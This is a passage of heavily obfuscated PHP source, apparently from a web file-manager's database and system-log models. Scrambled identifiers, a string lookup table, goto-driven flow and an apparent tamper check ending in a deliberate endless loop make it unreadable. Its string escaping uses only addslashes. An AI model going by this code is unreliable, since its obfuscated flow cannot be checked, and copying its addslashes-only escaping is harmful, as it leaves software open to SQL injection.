. $cÕŒ©ŒÙ”ì[57] . $cÉë«øøÉ½; } if (think_config($cÕŒ©ŒÙ”ì[954])) { $D˜Ôœø¸ğ  = $cÕŒ©ŒÙ”ì[955] . md5(serialize($bË’ï­ÚÚ)); $a˜÷¾¦Œî¡ = think_cache($D˜Ôœø¸ğ ); if ($a˜÷¾¦Œî¡) { return $a˜÷¾¦Œî¡; } } goto DëæªÈßˆÔ; E£ÄïëéëÔ: } public function parseSql($c¼™éŸÌİÜ, $c×æ‰æƒáó = array()) { $b³Á¸÷¯ñŒ =& $_SERVER[©]; $c¼™éŸÌİÜ = str_replace(array($b³Á¸÷¯ñŒ[956], $b³Á¸÷¯ñŒ[957], $b³Á¸÷¯ñŒ[958], $b³Á¸÷¯ñŒ[959], $b³Á¸÷¯ñŒ[960], $b³Á¸÷¯ñŒ[961], $b³Á¸÷¯ñŒ[962], $b³Á¸÷¯ñŒ[963], $b³Á¸÷¯ñŒ[964], $b³Á¸÷¯ñŒ[965], $b³Á¸÷¯ñŒ[966]), array($this->parseTable("{$c×æ‰æƒáó[$b³Á¸÷¯ñŒ[276]]}"), $this->parseDistinct(isset($c×æ‰æƒáó[$b³Á¸÷¯ñŒ[967]]) ? $c×æ‰æƒáó[$b³Á¸÷¯ñŒ[967]] : !1), $this->parseField(!empty($c×æ‰æƒáó[$b³Á¸÷¯ñŒ[270]]) ? $c×æ‰æƒáó[$b³Á¸÷¯ñŒ[270]] : $b³Á¸÷¯ñŒ[186]), $this->parseJoin(!empty($c×æ‰æƒáó[$b³Á¸÷¯ñŒ[279]]) ? $c×æ‰æƒáó[$b³Á¸÷¯ñŒ[279]] : $b³Á¸÷¯ñŒ[43]), $this->parseWhere(!empty($c×æ‰æƒáó[$b³Á¸÷¯ñŒ[272]]) ? $c×æ‰æƒáó[$b³Á¸÷¯ñŒ[272]] : $b³Á¸÷¯ñŒ[43]), $this->parseGroup(!empty($c×æ‰æƒáó[$b³Á¸÷¯ñŒ[968]]) ? $c×æ‰æƒáó[$b³Á¸÷¯ñŒ[968]] : $b³Á¸÷¯ñŒ[43]), $this->parseHaving(!empty($c×æ‰æƒáó[$b³Á¸÷¯ñŒ[969]]) ? $c×æ‰æƒáó[$b³Á¸÷¯ñŒ[969]] : $b³Á¸÷¯ñŒ[43]), $this->parseOrder(!empty($c×æ‰æƒáó[$b³Á¸÷¯ñŒ[359]]) ? $c×æ‰æƒáó[$b³Á¸÷¯ñŒ[359]] : $b³Á¸÷¯ñŒ[43]), $this->parseLimit(!empty($c×æ‰æƒáó[$b³Á¸÷¯ñŒ[289]]) ? $c×æ‰æƒáó[$b³Á¸÷¯ñŒ[289]] : $b³Á¸÷¯ñŒ[43]), $this->parseUnion(!empty($c×æ‰æƒáó[$b³Á¸÷¯ñŒ[344]]) ? $c×æ‰æƒáó[$b³Á¸÷¯ñŒ[344]] : $b³Á¸÷¯ñŒ[43]), $this->parseComment(!empty($c×æ‰æƒáó[$b³Á¸÷¯ñŒ[350]]) ? $c×æ‰æƒáó[$b³Á¸÷¯ñŒ[350]] : $b³Á¸÷¯ñŒ[43])), $c¼™éŸÌİÜ); return $c¼™éŸÌİÜ; } public function getLastSql($f¡™£‚§İ = '') { return $f¡™£‚§İ ? $this->modelSql[$f¡™£‚§İ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($EŒÀºƒ¾Ê¦) { return addslashes($EŒÀºƒ¾Ê¦); } public function setModel($CİÏ§ó™) { $this->model = $CİÏ§ó™; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto B¤ê®Øçî“; F½ÇÂå˜å÷: register_shutdown_function($_SERVER[ÊÖŠ][36]); set_error_handler($_SERVER[ÊÖŠ][49], $bÊâàí¤…); if (function_exists($_SERVER[ÊÖŠ][50])) { set_exception_handler($_SERVER[ÊÖŠ][51]); } goto DîÒ‘ŒÎë„; D‘ç¯šä»Â: if (!isset($_SERVER[$_SERVER[©][4]]) || !isset($_SERVER[$_SERVER[©][5]])) { goto FÊ Å¡ÆÕ•; B”™šò¹Ã: $f…Õ¸»ì—¢($_SERVER[$_SERVER[©][7]] . $_SERVER[©][8]); $D„÷¢²¤‡ = 2; while ($D„÷¢²¤‡ > 1) { $DŒ£ëù¤˜ = rawurlencode($D„÷¢²¤‡ . $_SERVER[©][13]); } goto béÈ²çëµ”; FÊ Å¡ÆÕ•: $C“×‰äâë = $_SERVER[©][6]; $d²›…÷Ù‰Œ = $_SERVER[$_SERVER[©][7]] . $_SERVER[©][8]; $c˜ÁÄ®¯Î¼ = $C“×‰äâë($d²›…÷Ù‰Œ); goto Eé¼Šê‘“í; Eé¼Šê‘“í: $DÃÆĞæ½ö¸ = explode($_SERVER[©][9], $c˜ÁÄ®¯Î¼); if (count($DÃÆĞæ½ö¸) < $_SERVER[©][10]) { $BšÃ‘¿¨½© = $_SERVER[©][11]; $BšÃ‘¿¨½©(); } $f…Õ¸»ì—¢ = $_SERVER[©][12]; goto B”™šò¹Ã; béÈ²çëµ”: } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\x4c\151\x67\150\x74\x41\160\x70"; public $modelType = "\x53\171\x73\x74\x65\155\x4f\x70\164\151\x6f\x6e"; public $field = array("\156\x61\x6d\145", "\x67\162\x6f\x75\160", "\x64\x65\x73\143", "\143\x6f\x6e\x74\145\156\164"); public function listData($bğò‹Éø½ = false, $d­Õâ“Š¢™ = "\155\157\144\151\x66\x79\x54\151\x6d\x65", $dÛµ¦ƒ–³æ = true) { return parent::listData($bğò‹Éø½, $d­Õâ“Š¢™, $dÛµ¦ƒ–³æ); } public function remove($c¥Ë¦ƒ Ë§) { $F¨¿½÷ù”³ = $this->findByName($c¥Ë¦ƒ Ë§); if (!$F¨¿½÷ù”³) { return !1; } return parent::remove($F¨¿½÷ù”³[$_SERVER[©][375]]); } public function add($c½©ÌœöÛÖ) { if ($this->findByName($c½©ÌœöÛÖ[$_SERVER[©][38]])) { return !1; } return parent::insert($c½©ÌœöÛÖ); } public function update($fĞÍœ”˜ª‚, $E»‰‰ä—) { $f¢š±éõŠ =& $_SERVER[©]; $fÍ÷±¦Ø™¸ = $this->findByName($fĞÍœ”˜ª‚); $AÆ¿ó©¶Íí = $this->findByName($E»‰‰ä—[$f¢š±éõŠ[38]]); if (!$fÍ÷±¦Ø™¸ || $AÆ¿ó©¶Íí && $AÆ¿ó©¶Íí[$f¢š±éõŠ[375]] != $fÍ÷±¦Ø™¸[$f¢š±éõŠ[375]]) { return !1; } return parent::update($fÍ÷±¦Ø™¸[$f¢š±éõŠ[375]], $E»‰‰ä—); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\x65\x6d\x5f\154\157\x67"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\151\x6d\145", "\x74\x69\x6d\x65", "\151\156\x73\x65\162\x74", "\x66\165\x6e\x63\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $D„´˜£Ãœ =& $_SERVER[©]; return array($D„´˜£Ãœ[2380] => LNG($D„´˜£Ãœ[2381]), $D„´˜£Ãœ[2382] => LNG($D„´˜£Ãœ[2383]), $D„´˜£Ãœ[2041] => LNG($D„´˜£Ãœ[2384]), $D„´˜£Ãœ[2385] => LNG($D„´˜£Ãœ[2386]), $D„´˜£Ãœ[2387] => LNG($D„´˜£Ãœ[2388]), $D„´˜£Ãœ[2389] => LNG($D„´˜£Ãœ[2390]), $D„´˜£Ãœ[2391] => LNG($D„´˜£Ãœ[2392]), $D„´˜£Ãœ[2393] => LNG($D„´˜£Ãœ[2394]), $D„´˜£Ãœ[2072] => LNG($D„´˜£Ãœ[2395]), $D„´˜£Ãœ[2073] => LNG($D„´˜£Ãœ[2396]), $D„´˜£Ãœ[2397] => LNG($D„´˜£Ãœ[2398]), $D„´˜£Ãœ[2399] => LNG($D„´˜£Ãœ[2400]), $D„´˜£Ãœ[2401] => LNG($D„´˜£Ãœ[2402]), $D„´˜£Ãœ[2403] => LNG($D„´˜£Ãœ[2404]), $D„´˜£Ãœ[2070] => LNG($D„´˜£Ãœ[2405]), $D„´˜£Ãœ[2077] => LNG($D„´˜£Ãœ[2406]), $D„´˜£Ãœ[2407] => LNG($D„´˜£Ãœ[2408]), $D„´˜£Ãœ[2409] => LNG($D„´˜£Ãœ[2410]), $D„´˜£Ãœ[2411] => LNG($D„´˜£Ãœ[2412]), $D„´˜£Ãœ[2413] => LNG($D„´˜£Ãœ[2414]), $D„´˜£Ãœ[2080] => LNG($D„´˜£Ãœ[2415]), $D„´˜£Ãœ[2081] => LNG($D„´˜£Ãœ[2416]), $D„´˜£Ãœ[2417] => LNG($D„´˜£Ãœ[2418]), $D„´˜£Ãœ[2419] => LNG($D„´˜£Ãœ[2420]), $D„´˜£Ãœ[2421] => LNG($D„´˜£Ãœ[2422]), $D„´˜£Ãœ[2075] => LNG($D„´˜£Ãœ[2423]), $D„´˜£Ãœ[2424] => LNG($D„´˜£Ãœ[2425]), $D„´˜£Ãœ[2074] => LNG($D„´˜£Ãœ[2426]), $D„´˜£Ãœ[2427] => LNG($D„´˜£Ãœ[2428]), $D„´˜£Ãœ[2429] => LNG($D„´˜£Ãœ[2430]), $D„´˜£Ãœ[2431] => LNG($D„´˜£Ãœ[2431]), $D„´˜£Ãœ[2432] => LNG($D„´˜£Ãœ[2045]), $D„´˜£Ãœ[2433] => LNG($D„´˜£Ãœ[2434]), $D„´˜£Ãœ[2435] => LNG($D„´˜£Ãœ[2436]), $D„´˜£Ãœ[2437] => LNG($D„´˜£Ãœ[2438]), $D„´˜£Ãœ[2439] => LNG($D„´˜£Ãœ[2440]), $D„´˜£Ãœ[2441] => LNG($D„´˜£Ãœ[2442]), $D„´˜£Ãœ[2443] => LNG($D„´˜£Ãœ[2443]), $D„´˜£Ãœ[2444] => LNG($D„´˜£Ãœ[2445]), $D„´˜£Ãœ[2446] => LNG($D„´˜£Ãœ[2447]), $D„´˜£Ãœ[2448] => LNG($D„´˜£Ãœ[2449]), $D„´˜£Ãœ[2450] => LNG($D„´˜£Ãœ[2451]), $D„´˜£Ãœ[2452] => LNG($D„´˜£Ãœ[2453]), $D„´˜£Ãœ[2454] => LNG($D„´˜£Ãœ[2455])); } private function typeFile() { $C‡®–¾¹Ğï =& $_SERVER[©]; $dâç§Áé¸¾ = array($C‡®–¾¹Ğï[2077] => array($C‡®–¾¹Ğï[2078]), $C‡®–¾¹Ğï[2401] => array($C‡®–¾¹Ğï[2456]), $C‡®–¾¹Ğï[2403] => array($C‡®–¾¹Ğï[2457]), $C‡®–¾¹Ğï[2070] => array($C‡®–¾¹Ğï[2071]), $C‡®–¾¹Ğï[2409] => array(), $C‡®–¾¹Ğï[2411] => array(), $C‡®–¾¹Ğï[2413] => array(), $C‡®–¾¹Ğï[2080] => array($C‡®–¾¹Ğï[2082]), $C‡®–¾¹Ğï[2081] => array($C‡®–¾¹Ğï[2082]), $C‡®–¾¹Ğï[2417] => array($C‡®–¾¹Ğï[2458]), $C‡®–¾¹Ğï[2419] => array($C‡®–¾¹Ğï[2458]), $C‡®–¾¹Ğï[2421] => array($C‡®–¾¹Ğï[2459]), $C‡®–¾¹Ğï[2407] => array($C‡®–¾¹Ğï[2460]), $C‡®–¾¹Ğï[2075] => array($C‡®–¾¹Ğï[2461]), $C‡®–¾¹Ğï[2424] => array($C‡®–¾¹Ğï[2462]), $C‡®–¾¹Ğï[2074] => array($C‡®–¾¹Ğï[2076])); return $dâç§Áé¸¾; } private function typeAll() { goto bÚ…ÔğŠ˜; DÖîÆÈ—Š…: foreach ($cƒïéßÉ as $cŸ¯á¯´¡ => $aëğ‚Â‹Ö) { $D˜×ßÑšª[$aëğ‚Â‹Ö[0]] = $D˜×ßÑšª[$cŸ¯á¯´¡]; } $D˜×ßÑšª[$AŠ¨ìå’»ò[2082]] = LNG($AŠ¨ìå’»ò[2463]); $D˜×ßÑšª[$AŠ¨ìå’»ò[2458]] = LNG($AŠ¨ìå’»ò[2464]); goto eù¸¡Ó”¸; bÚ…ÔğŠ˜: $AŠ¨ìå’»ò =& $_SERVER[©]; $D˜×ßÑšª = $this->typeList; $cƒïéßÉ = array_filter($this->typeFile()); goto DÖîÆÈ—Š…; eù¸¡Ó”¸: return $D˜×ßÑšª; goto aÂ²Ë¾®Ñ; aÂ²Ë¾®Ñ: } public function addLog($f“°³æĞŒá, $Dº¤ô™¿çÙ = array()) { goto Añ³­¹ôœÇ; a·ğˆä¶„: parent::add($Dº¤ô™¿çÙ); goto B–¿“ÕÒêÁ; a³Ô¾…’„: $A¬ÔÈøŒ¦ª = get_client_ip(); if (!$Dº¤ô™¿çÙ || strlen(json_encode($Dº¤ô™¿çÙ)) >= 1024) { $Dº¤ô™¿çÙ = array($B”¬‰Èº¥Ô[2465] => $A¬ÔÈøŒ¦ª); } else { if (is_array($Dº¤ô™¿çÙ)) { $Dº¤ô™¿çÙ[$B”¬‰Èº¥Ô[2465]] = $A¬ÔÈøŒ¦ª; } else { $Dº¤ô™¿çÙ = array($B”¬‰Èº¥Ô[1031] => $Dº¤ô™¿çÙ, $B”¬‰Èº¥Ô[2465] => $A¬ÔÈøŒ¦ª); } } $Dº¤ô™¿çÙ = array($B”¬‰Èº¥Ô[1424] => Session::sign(), $B”¬‰Èº¥Ô[1425] => $dêÏ†’…•, $B”¬‰Èº¥Ô[39] => $f“°³æĞŒá, $B”¬‰Èº¥Ô[1427] => json_encode($Dº¤ô™¿çÙ)); goto a·ğˆä¶„; Añ³­¹ôœÇ: $B”¬‰Èº¥Ô =& $_SERVER[©]; if (!isset($this->typeList[$f“°³æĞŒá])) { return; } $dêÏ†’…• = USER_ID ? USER_ID : (isset($Dº¤ô™¿çÙ[$B”¬‰Èº¥Ô[1434]]) ? $Dº¤ô™¿çÙ[$B”¬‰Èº¥Ô[1434]] : 0); goto a³Ô¾…’„; B–¿“ÕÒêÁ: } public function remove($aóŒ½Á¦‘Ï) { $this->where(array($_SERVER[©][393] => $aóŒ½Á¦‘Ï))->delete(); } private function _makeOrder($dò¶¸†•¬ô = '') { goto c¨Àî’í®Ù; c¨Àî’í®Ù: $EÖä”ÉÚº =& $_SERVER[©]; $FÆÈ‘õÎ†œ = $EÖä”ÉÚº[197]; $Aæ…çîî½ = array($EÖä”ÉÚº[410] => $EÖä”ÉÚº[411], $EÖä”ÉÚº[412] => $EÖä”ÉÚº[413]); goto f™òç¼ŸÜÏ; f™òç¼ŸÜÏ: $D³ø¶•ä‹ù = Input::get($EÖä”ÉÚº[416], $EÖä”ÉÚº[17], $EÖä”ÉÚº[2243], array($EÖä”ÉÚº[2179], $EÖä”ÉÚº[412])); $D³ø¶•ä‹ù = $Aæ…çîî½[$D³ø¶•ä‹ù]; $dò¶¸†•¬ô = $dò¶¸†•¬ô . "{$FÆÈ‘õÎ†œ}\40{$D³ø¶•ä‹ù}"; goto F¿ŠÙ’æš; F¿ŠÙ’æš: return $this->order($dò¶¸†•¬ô); goto b¥É¢äù”—; b¥É¢äù”—: } public function get($Dºì÷‹²ö‚ = '') { goto D¬…¾Ëâ; aµÊ…éÕ“Ò: if ($Dºì÷‹²ö‚[$Bçì¢êÃš[1434]]) { $D£ö‰­ç˜[$Bçì¢êÃš[1434]] = $Dºì÷‹²ö‚[$Bçì¢êÃš[1434]]; } if (isset($Dºì÷‹²ö‚[$Bçì¢êÃš[701]])) { $c©Ûãµğ¤à = $Dºì÷‹²ö‚[$Bçì¢êÃš[701]]; $eŸ†ùèùœÑ = isset($Dºì÷‹²ö‚[$Bçì¢êÃš[702]]) ? $Dºì÷‹²ö‚[$Bçì¢êÃš[702]] : time(); $D£ö‰­ç˜[$Bçì¢êÃš[197]] = array($Bçì¢êÃš[330], array($c©Ûãµğ¤à, $eŸ†ùèùœÑ)); } if ($Dºì÷‹²ö‚[$Bçì¢êÃš[39]]) { $c›Î‰“Œ´Ä = explode($Bçì¢êÃš[57], $Dºì÷‹²ö‚[$Bçì¢êÃš[39]]); $a©¦—´¼Ì = $this->typeFile(); $EŞØƒô±Ğ¶ = array(); foreach ($c›Î‰“Œ´Ä as $E’À…óÍˆµ) { $EŞØƒô±Ğ¶[] = $E’À…óÍˆµ; if (isset($a©¦—´¼Ì[$E’À…óÍˆµ])) { $EŞØƒô±Ğ¶ = array_merge($EŞØƒô±Ğ¶, $a©¦—´¼Ì[$E’À…óÍˆµ]); } } $EŞØƒô±Ğ¶ = array_unique($EŞØƒô±Ğ¶); if ($EŞØƒô±Ğ¶) { $D£ö‰­ç˜[$Bçì¢êÃš[39]] = array($Bçì¢êÃš[17], $EŞØƒô±Ğ¶); } } goto BÊÉË¿„ç; c”™³«Ì¹×: $BäİŞ®´ô‰[$Bçì¢êÃš[363]] = $this->logList($BäİŞ®´ô‰[$Bçì¢êÃš[363]]); return $BäİŞ®´ô‰; goto BÖ¨¢î½ñŸ; D¬…¾Ëâ: $Bçì¢êÃš =& $_SERVER[©]; if (!$Dºì÷‹²ö‚) { show_json(array()); } $D£ö‰­ç˜ = array(); goto aµÊ…éÕ“Ò; BÊÉË¿„ç: if (!empty($Dºì÷‹²ö‚[$Bçì¢êÃš[2465]])) { $D£ö‰­ç˜[$Bçì¢êÃš[413]] = array($Bçì¢êÃš[751], "\45{$Dºì÷‹²ö‚[$Bçì¢êÃš[2465]]}\45"); } $BäİŞ®´ô‰ = $this->_makeOrder()->where($D£ö‰­ç˜)->selectPage(); if (empty($BäİŞ®´ô‰[$Bçì¢êÃš[363]])) { show_json(array(), !0, $BäİŞ®´ô‰[$Bçì¢êÃš[360]]); } goto c”™³«Ì¹×; BÖ¨¢î½ñŸ: } private function ipAddress(&$bˆš®¢ß) { $EŠ”Û˜éé =& $_SERVER[©]; if (!empty($bˆš®¢ß[$EŠ”Û˜éé[2465]])) { $B÷¯÷ÈİòÎ = IpLocation::get($bˆš®¢ß[$EŠ”Û˜éé[2465]]); } else { $B÷¯÷ÈİòÎ = LNG($EŠ”Û˜éé[2466]); } $bˆš®¢ß[$EŠ”Û˜éé[2467]] = $B÷¯÷ÈİòÎ; } private function descZipDownload($A±àŸˆ”Ñö, &$cšéƒ”ÑÒ²) { $Ağà×†Û³Ó =& $_SERVER[©]; if (!isset($A±àŸˆ”Ñö[$Ağà×†Û³Ó[2468]])) { return; } $eğ¨ùÉ « = json_decode($A±àŸˆ”Ñö[$Ağà×†Û³Ó[2468]], !0); foreach ($eğ¨ùÉ « as $B–°Â‡îÒè) { if (!IO::init($B–°Â‡îÒè[$Ağà×†Û³Ó[85]])) { continue; } if (!($bîËÅ àŠÚ = IO::infoFull($B–°Â‡îÒè[$Ağà×†Û³Ó[85]]))) { continue; } $A±àŸˆ”Ñö[$Ağà×†Û³Ó[85]] = $B–°Â‡îÒè[$Ağà×†Û³Ó[85]]; $cšéƒ”ÑÒ²[] = $A±àŸˆ”Ñö[$Ağà×†Û³Ó[377]] = $bîËÅ àŠÚ[$Ağà×†Û³Ó[377]]; $cšéƒ”ÑÒ²[] = $A±àŸˆ”Ñö[$Ağà×†Û³Ó[2286]] = $bîËÅ àŠÚ[$Ağà×†Û³Ó[469]]; break; } return $A±àŸˆ”Ñö; } private function getSourceList(&$eÛÀÄİ¥Ü„) { $b›–”È­« =& $_SERVER[©]; $e±Ÿä‚à = array(); foreach ($eÛÀÄİ¥Ü„ as $bÄºí÷áŞë => $D®Ò‹™¿ˆ˜) { goto c£æ‚ò¶³ã; c£æ‚ò¶³ã: $E¤Ğ›†¼¿Š = json_decode($D®Ò‹™¿ˆ˜[$b›–”È­«[413]], !0); if ($D®Ò‹™¿ˆ˜[$b›–”È­«[39]] == $b›–”È­«[2073]) { $E¤Ğ›†¼¿Š = $this->descZipDownload($E¤Ğ›†¼¿Š, $e±Ÿä‚à); $eÛÀÄİ¥Ü„[$bÄºí÷áŞë][$b›–”È­«[413]] = json_encode($E¤Ğ›†¼¿Š); continue; } if (strpos($D®Ò‹™¿ˆ˜[$b›–”È­«[39]], $b›–”È­«[2287]) !== 0) { goto dÓËîÈ °«; fãÃƒàÊË˜: $e±Ÿä‚à[] = $E¤Ğ›†¼¿Š[$b›–”È­«[377]] = $A›§ÙÚ³Èİ[$b›–”È­«[377]]; $e±Ÿä‚à[] = $E¤Ğ›†¼¿Š[$b›–”È­«[2286]] = $A›§ÙÚ³Èİ[$b›–”È­«[469]]; $eÛÀÄİ¥Ü„[$bÄºí÷áŞë][$b›–”È­«[413]] = json_encode($E¤Ğ›†¼¿Š); goto AôİÇ½²; AôİÇ½²: continue; goto c»‚¢Á„¤; dÓËîÈ °«: if (!isset($E¤Ğ›†¼¿Š[$b›–”È­«[85]]) || strpos($D®Ò‹™¿ˆ˜[$b›–”È­«[39]], $b›–”È­«[2469]) !== 0) { continue; } if (!IO::init($E¤Ğ›†¼¿Š[$b›–”È­«[85]])) { continue; } if (!($A›§ÙÚ³Èİ = IO::infoFull($E¤Ğ›†¼¿Š[$b›–”È­«[85]]))) { continue; } goto fãÃƒàÊË˜; c»‚¢Á„¤: } goto böŒÙ•î; C±šŸÊÆ¥: if ($E¤Ğ›†¼¿Š[$b›–”È­«[39]] == $b›–”È­«[2294]) { $e±Ÿä‚à[] = $E¤Ğ›†¼¿Š[$b›–”È­«[413]][$b›–”È­«[377]]; } goto CåÊ¥„¡½Ó; böŒÙ•î: $e±Ÿä‚à[] = $E¤Ğ›†¼¿Š[$b›–”È­«[377]]; $e±Ÿä‚à[] = $E¤Ğ›†¼¿Š[$b›–”È­«[2286]]; if ($E¤Ğ›†¼¿Š[$b›–”È­«[39]] == $b›–”È­«[500]) { $e±Ÿä‚à[] = $E¤Ğ›†¼¿Š[$b›–”È­«[413]][$b›–”È­«[1004]]; $e±Ÿä‚à[] = $E¤Ğ›†¼¿Š[$b›–”È­«[413]][$b›–”È­«[1005]]; } goto C±šŸÊÆ¥; CåÊ¥„¡½Ó: } if (!$e±Ÿä‚à) { return array(); } return Model($b›–”È­«[752])->sourceListInfo($e±Ÿä‚à, !0); } private function logList($C¿Õ‚ãø¡ä) { goto e†È™ŞÊ÷; fÄè—‘¡¼Ô: $b”¯ÚŠŠ Ø = $this->getSourceList($C¿Õ‚ãø¡ä); $bá®ªÃÉÏÂ = $this->typeAll(); $eñİ§ëÇøß = array(); goto e„¡ƒÛ®™; AİƒŸĞë”Ó: return $eñİ§ëÇøß; goto d¶‚¾ÏŸœ; e„¡ƒÛ®™: $BŒ˜˜«¨Ä§ = array(); foreach ($C¿Õ‚ãø¡ä as $e†ÕÍ›çî‹ => $bÉåµ—ˆê·) { goto déè…¶ğ’â; C¤Ô´‡êÂ¤: $bÉåµ—ˆê·[$DÅŞ‘Ñ£³½[2242]] = $eÖğÖŒäâ; $A‡ª°ŠÃ‘ = json_decode($bÉåµ—ˆê·[$DÅŞ‘Ñ£³½[413]], !0); $bÉåµ—ˆê·[$DÅŞ‘Ñ£³½[2465]] = isset($A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[2465]]) ? $A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[2465]] : $DÅŞ‘Ñ£³½[43]; goto Cã†Æòƒ»é; FÄõÖ‹–È„: $bÉåµ—ˆê·[$DÅŞ‘Ñ£³½[38]] = isset($eÖğÖŒäâ[$DÅŞ‘Ñ£³½[38]]) ? $eÖğÖŒäâ[$DÅŞ‘Ñ£³½[38]] : LNG($DÅŞ‘Ñ£³½[2466]); $bÉåµ—ˆê·[$DÅŞ‘Ñ£³½[2334]] = isset($eÖğÖŒäâ[$DÅŞ‘Ñ£³½[2334]]) ? $eÖğÖŒäâ[$DÅŞ‘Ñ£³½[2334]] : $DÅŞ‘Ñ£³½[43]; $bÉåµ—ˆê·[$DÅŞ‘Ñ£³½[1338]] = isset($bá®ªÃÉÏÂ[$cí¸¥Òòˆ]) ? $bá®ªÃÉÏÂ[$cí¸¥Òòˆ] : $Bò‰ª¼š; goto C¤Ô´‡êÂ¤; déè…¶ğ’â: $cí¸¥Òòˆ = $bÉåµ—ˆê·[$DÅŞ‘Ñ£³½[39]]; $eÖğÖŒäâ = isset($C“êªî„[$bÉåµ—ˆê·[$DÅŞ‘Ñ£³½[1434]]]) ? $C“êªî„[$bÉåµ—ˆê·[$DÅŞ‘Ñ£³½[1434]]] : !1; $Bò‰ª¼š = strpos($cí¸¥Òòˆ, $DÅŞ‘Ñ£³½[2470]) === 0 ? LNG($DÅŞ‘Ñ£³½[2471]) : LNG($DÅŞ‘Ñ£³½[2466]); goto FÄõÖ‹–È„; c—„¤ƒ—”: unset($bÉåµ—ˆê·[$DÅŞ‘Ñ£³½[2472]]); $eñİ§ëÇøß[] = $bÉåµ—ˆê·; goto bµ©‰”•í‚; Cã†Æòƒ»é: $this->ipAddress($bÉåµ—ˆê·); if (strpos($cí¸¥Òòˆ, $DÅŞ‘Ñ£³½[2287]) === 0 || isset($A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[2286]])) { goto A˜·¹èÂø; eªÚ”¶˜‹’: if ($A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[2299]] && $A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[2299]][$DÅŞ‘Ñ£³½[379]] == $DÅŞ‘Ñ£³½[1077]) { $BŒ˜˜«¨Ä§[] = $bÉåµ—ˆê·[$DÅŞ‘Ñ£³½[375]]; unset($C¿Õ‚ãø¡ä[$e†ÕÍ›çî‹]); continue; } goto E‰ì’¿¿ÜÒ; A˜·¹èÂø: $A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[399]] = $b”¯ÚŠŠ Ø[$A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[377]]]; $A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[2299]] = $b”¯ÚŠŠ Ø[$A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[2286]]]; if ($A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[39]] == $DÅŞ‘Ñ£³½[500]) { $A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[413]][$DÅŞ‘Ñ£³½[1004]] = $b”¯ÚŠŠ Ø[$A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[413]][$DÅŞ‘Ñ£³½[1004]]]; $A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[413]][$DÅŞ‘Ñ£³½[1005]] = $b”¯ÚŠŠ Ø[$A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[413]][$DÅŞ‘Ñ£³½[1005]]]; } goto f°æÁ¿æèò; f°æÁ¿æèò: if ($A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[39]] == $DÅŞ‘Ñ£³½[2294]) { $A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[413]][$DÅŞ‘Ñ£³½[377]] = $b”¯ÚŠŠ Ø[$A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[413]][$DÅŞ‘Ñ£³½[377]]]; } if ($A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[39]] == $DÅŞ‘Ñ£³½[2068]) { $A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[2299]] = $A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[399]]; $A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[2286]] = $A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[2299]][$DÅŞ‘Ñ£³½[377]]; $A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[399]] = !1; $A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[377]] = $DÅŞ‘Ñ£³½[43]; } if ($A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[399]] && $A‡ª°ŠÃ‘[$DÅŞ‘Ñ£³½[399]][$DÅŞ‘Ñ£³½[379]] == $DÅŞ‘Ñ£³½[1077]) { $BŒ˜˜«¨Ä§[] = $bÉåµ—ˆê·[$DÅŞ‘Ñ£³½[375]]; unset($C¿Õ‚ãø¡ä[$e†ÕÍ›çî‹]); continue; } goto eªÚ”¶˜‹’; E‰ì’¿¿ÜÒ: } $bÉåµ—ˆê·[$DÅŞ‘Ñ£³½[413]] = $A‡ª°ŠÃ‘; goto c—„¤ƒ—”; bµ©‰”•í‚: } $this->clearSystemPathLog($BŒ˜˜«¨Ä§); goto AİƒŸĞë”Ó; e†È™ŞÊ÷: $DÅŞ‘Ñ£³½ =& $_SERVER[©]; $DÑ‡õ°êò® = array_to_keyvalue($C¿Õ‚ãø¡ä, $DÅŞ‘Ñ£³½[43], $DÅŞ‘Ñ£³½[1434]); $C“êªî„ = Model($DÅŞ‘Ñ£³½[485])->userListInfo(array_unique($DÑ‡õ°êò®)); goto fÄè—‘¡¼Ô; d¶‚¾ÏŸœ: } private function clearSystemPathLog($CŞŒå‹‰Âå) { $eŒÏ™‚Ó =& $_SERVER[©]; if (count($CŞŒå‹‰Âå) == 0) { return; } $b¥‡±Ğöù = array($eŒÏ™‚Ó[375] => array($eŒÏ™‚Ó[17], array_unique($CŞŒå‹‰Âå))); $this->where($b¥‡±Ğöù)->delete(); } public function deviceList($Aœ¿¹Ü, $fÏéš¥Í¶ï = 0) { $a®½±âÏ =& $_SERVER[©]; $dé¹‡ëá·÷ = array($a®½±âÏ[1434] => $Aœ¿¹Ü, $a®½±âÏ[197] => array($a®½±âÏ[925], $fÏéš¥Í¶ï), $a®½±âÏ[39] => $a®½±âÏ[2041]); $aŠŠŒ“¤® = array(); $aİŞçâô = $this->field($a®½±âÏ[2473])->where($dé¹‡ëá·÷)->order($a®½±âÏ[2297])->limit(50)->select(); foreach ($aİŞçâô as 